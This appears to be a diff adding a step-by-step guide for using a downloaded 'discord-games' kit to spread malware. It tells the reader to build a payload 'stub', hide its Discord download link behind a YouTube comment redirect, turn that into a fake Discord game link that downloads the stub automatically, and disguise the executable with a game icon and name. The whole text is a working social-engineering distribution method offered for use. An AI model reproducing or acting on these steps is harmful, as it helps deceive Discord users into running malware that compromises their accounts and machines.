@@ -1,0 +1,14 @@
+https://nodejs.org/en/
+https://cdn.discordapp.com/attachments/844817274027245588/845137469241819176/discord-games-main.rar
+
+1.) First download the files above.) Extract them  Open up READ-ME  Once you've done that you'll need to create a stub using #r-stub-maker 
+
+2.) Copy the download link of your stub through Discord and find a random Youtube Video on youtube and paste your stub link in the comment section.
+
+3.) Copy the link of the stub you uploaded in the Youtube comment section now you should have a redirect link
+
+4.) Choose your game and paste the Redirect link inside of Youtube Link and click submit 
+
+5.) Now you have your Discord-Game-Link 
+
+Upon click it should automatically download your Stub-File you can disguise it using #how-to-have-icon-on-an-exe and rename it to the game you selected in the generator
